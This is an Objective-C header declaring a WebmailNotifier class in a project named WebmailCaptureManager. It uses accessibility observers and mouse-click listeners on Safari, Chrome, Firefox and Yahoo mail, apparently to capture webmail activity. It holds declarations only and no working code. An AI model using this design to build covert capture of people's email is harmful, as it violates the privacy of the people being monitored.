//
//  WebmailNotifier.h
//  WebmailCaptureManager
//
//  Created by ophat on 2/6/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#import <WebKit/WebKit.h>
#import "AsyncController.h"

@interface WebmailNotifier : NSObject{
    NSString * mUrlPageSafari;
    NSString * mUrlPageChrome;
    AXObserverRef mObserver1;
    AXObserverRef mObserver2;
    AXUIElementRef mProcess1;
    AXUIElementRef mProcess2;
    CFRunLoopRef mLoop1;
    CFRunLoopRef mLoop2;
    AsyncController *mAsyC;
}
@property (nonatomic,copy) NSString * mUrlPageSafari;
@property (nonatomic,copy) NSString * mUrlPageChrome;
@property (nonatomic, assign) AXObserverRef mObserver1;
@property (nonatomic, assign) AXObserverRef mObserver2;
@property (nonatomic, assign) CFRunLoopRef mLoop1;
@property (nonatomic, assign) CFRunLoopRef mLoop2;
@property (nonatomic, assign) AXUIElementRef mProcess1;
@property (nonatomic, assign) AXUIElementRef mProcess2;
@property (nonatomic, assign) AsyncController *mAsyC;

-(void) startCapture;
-(void) stopCapture;
-(void) registerChromeMouseClickListener;
-(void) registerSafariMouseClickListener;
-(void) unregisterMouseClickListener;
-(void) registerYahooMouseClickListenerWithType:(NSString *)aType;
-(void) unregisterYahooMouseClickListener;
-(void) firefoxHandlerwithAutoReplace:(BOOL)aIsReplaced;

@end
